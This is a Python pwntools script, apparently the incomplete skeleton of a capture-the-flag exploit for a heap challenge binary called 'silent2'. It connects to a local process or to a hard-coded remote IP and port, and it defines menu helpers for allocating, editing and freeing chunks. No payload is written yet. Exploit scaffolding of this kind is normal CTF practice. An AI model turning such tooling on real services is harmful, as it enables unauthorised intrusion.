#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    #  io = process("", env = {"LD_PRELOAD": ""})
    io = process("./silent2")

else:
    io = remote("39.107.32.132", 10001)

elf = ELF("./silent2")
#  libc = ELF("")

def DEBUG():
    #  print "pid -> {}".format(proc.pidof(io))
    raw_input("DEBUG: ")
    gdb.attach(io, "set follow-fork-mode parent")

def add(size, payload):
    io.sendline("1")
    sleep(0.1)
    io.sendline(str(size))
    sleep(0.1)
    io.sendline(payload)
    sleep(0.1)

def edit(idx, payload1, payload2):
    io.sendline("3")
    sleep(0.1)
    io.sendline(str(idx))
    sleep(0.1)
    io.sendline(payload1)
    sleep(0.1)
    io.sendline(payload2)
    sleep(0.1)

def delete(idx):
    io.sendline("2")
    sleep(0.1)
    io.sendline(str(idx))


if __name__ == "__main__":
    io.recvuntil("==+RWBXtIRRV+.+IiYRBYBRRYYIRI;VitI;=;..........:::.::;::::...;;;:.\n\n\n")

